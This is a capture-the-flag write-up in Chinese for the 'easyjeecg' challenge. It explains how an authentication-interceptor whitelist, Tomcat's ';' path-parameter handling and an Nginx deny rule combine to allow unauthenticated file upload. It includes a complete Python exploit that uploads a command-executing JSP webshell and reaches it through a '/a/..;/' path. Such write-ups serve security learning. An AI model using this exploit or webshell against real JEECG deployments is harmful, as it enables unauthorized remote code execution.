# easyjeecg

## 题目简述

题目给出一套 JEECG/Tomcat8 应用，外层 Nginx 监听 80 并代理到本机 8080。附件中的 `spring-mvc.xml` 配置了 `AuthInterceptor` 登录拦截，但 `excludeContainUrls` 中包含 `toLogin.do`；Tomcat 对路径参数 `;` 的处理又会让 `cgUploadController.do;toLogin.do?...` 仍路由到上传 Controller，同时命中登录白名单。`Dockerfile` 还把 `/usr/local/tomcat/webapps/ROOT/upload/` 设为可写，`flag.sh` 给 `/readflag` 设置 setuid。解题目标是未登录上传 JSP WebShell，再绕过 Nginx 对 `/upload/*.jsp` 的直接访问限制执行 `/readflag`。

## 解题过程

1. 使用 `...;/` 绕过过滤器的登录检查。`AuthInterceptor` 会把包含 `toLogin.do` 的请求当作白名单，Tomcat 又会把分号后的路径参数剥离后继续分发到真实 Controller。
2. 访问 `cgUploadController.do;toLogin.do?ajaxSaveFile` 触发任意文件上传。上传接口返回 JSON，其中 `url` 字段就是落地后的路径。
3. 外层 Nginx 的配置只对正则 `^/upload/.*\.jsp$` 做 `deny all`，直接访问 `/upload/xxx.jsp` 会被拦。可以上传 `jspx`，也可以请求 `/a/..;/upload/xxx.jsp`，让 Nginx 不命中 deny 规则，同时让 Tomcat 归一化后进入上传目录。

关键配置可以概括为两处：`spring-mvc.xml` 的 `AuthInterceptor` 对包含 `toLogin.do` 的 URL 放行；Nginx 只拒绝原始 URI 命中 `/upload/*.jsp` 的请求。只要请求同时满足“Spring 看见白名单字符串”和“Nginx 不命中 deny 正则”，就能绕过。

exp:

```python
import re

import requests
import sys
Target=sys.argv[1]
shellData="""<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%
    BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(request.getParameter("name")).getInputStream()));
    String line = null;
    StringBuffer b = new StringBuffer();
    while ((line = br.readLine()) != null) {
        b.append(line + " ");
    }
    out.println(b.toString());
%>"""
shellPath=(re.search('"url":"(.*?)"',requests.post(url=Target+"/cgUploadController.do;toLogin.do?ajaxSaveFile",files={"file":("1.jsp",shellData)}).text,re.I|re.M).group(1))
print(Target+"/a/..;/"+shellPath+"?name=/readflag")
print(requests.get(url=Target+"/a/..;/"+shellPath+"?name=/readflag").text)
```

## 方法总结

本题核心是两层解析差异：Spring 拦截器按字符串白名单判断 `toLogin.do`，Tomcat 按路径参数语义处理 `;`，Nginx 又只按原始 URI 正则拦截 `/upload/*.jsp`。把三者串起来即可未授权上传并执行 JSP。

识别信号是 JEECG 的 `cgUploadController.do?ajaxSaveFile` 上传点、`spring-mvc.xml` 中 `toLogin.do` 白名单、Nginx 只拦直接 `/upload/*.jsp`、上传目录具有写权限。

复现时要同时检查上传返回路径和实际访问路径。上传请求需要把 `toLogin.do` 放到路径参数位置绕登录，执行请求则用 `/a/..;/` 这类路径让 Nginx 与 Tomcat 对同一 URI 得出不同结论。
